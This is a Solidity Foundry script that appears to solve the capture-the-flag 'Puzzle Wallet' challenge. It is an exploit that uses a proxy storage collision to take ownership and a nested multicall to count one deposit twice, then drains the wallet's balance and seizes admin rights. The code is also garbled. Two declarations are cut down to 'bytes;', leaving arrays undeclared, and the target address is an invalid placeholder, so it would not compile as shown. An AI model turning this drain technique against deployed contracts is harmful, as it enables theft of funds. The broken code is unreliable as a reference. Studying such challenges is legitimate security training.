
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IPuzzleProxy proxy = IPuzzleProxy(target);
        IPuzzleWallet wallet = IPuzzleWallet(target);

        address player = vm.addr(vm.envUint("PRIVATE_KEY"));

        // 1. Become owner via storage collision
        proxy.proposeNewAdmin(player);

        // 2. Whitelist yourself
        wallet.addToWhitelist(player);

        // 3. Prepare multicall exploit
        bytes;
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes;
        multicallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);

        // 4. Call multicall with 0.001 ETH (adjust if needed)
        wallet.multicall{value: 1e15}(multicallData);

        // 5. Drain funds
        wallet.execute(player, address(target).balance, "");

        // 6. Become admin via storage collision
        wallet.setMaxBalance(uint256(uint160(player)));

        vm.stopBroadcast();
    }
}